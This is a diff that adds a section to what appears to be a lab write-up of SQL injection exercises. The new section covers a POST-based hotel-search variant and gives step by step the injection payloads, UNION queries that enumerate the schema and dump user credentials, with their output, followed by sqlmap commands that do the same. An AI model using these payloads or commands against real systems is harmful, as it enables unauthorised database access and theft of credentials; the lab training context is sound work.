@@ -138,3 +138,60 @@ http://13.127.82.143/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/deta
 4, 5694 7680 6474 2353
 
 5, 5137 6681 6694 1681
+
+
+## Post Based SQL Injection Variant 2
+### query:
+SELECT * FROM hotels WHERE city='Delhi''
+
+### task:
+You have valid credentials for this login page (Username: test2@test.com; Password: pass). Your task is to intercept the POST requests and try performing SQL injection manually and by using sqlmap.
+
+### payload:
+' OR 1=1--+
+
+SELECT * FROM hotels WHERE city=Delhi' ORDER BY 1,2,3,4,5,6,7,8,9--+'
+
+SELECT * FROM hotels WHERE city=Delhi' UNION SELECT 1,2,3,4,5,6,7--+'
+
+SELECT * FROM hotels WHERE city=Delhi' UNION SELECT 1,database(),3,4,version(),6,7--+'
+
+database-->SQL_Injection_V7
+version-->5.7.29-0ubuntu0.18.04.1
+
+SELECT * FROM hotels WHERE city='Delhi' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,version(),6,7 FROM information_schema.tables WHERE table_type='BASE TABLE'--+'
+
+tables-->hotels,users
+
+SELECT * FROM hotels WHERE city='Delhi' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,version(),6,7 FROM information_schema.columns WHERE table_name='users'--+'
+
+columns-->id,username,password
+
+SELECT * FROM hotels WHERE city='Delhi' UNION SELECT 1,GROUP_CONCAT(id),3,4,GROUP_CONCAT(username),GROUP_CONCAT(password),7 FROM users--+'
+
+id-->1,2
+
+username-->test@test.com,test2@test.com 
+
+password-->pass,1a1dc91c907325c69271ddf0c944bc72
+
+*second approach*
+
+intercept POST request in burp suite copy the request in notepad and name it post_sql.txt save it in same directory as sqlmap
+
+(searching for database name)
+
+python sqlmap.py -r post_sql.txt --dbs
+
+(searching for table names)
+
+python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 --tables
+
+(searching for columns names)
+
+python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 -T users --columns
+
+(getting data from columns)
+
+python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 -T users -C id,username,password --dump
+
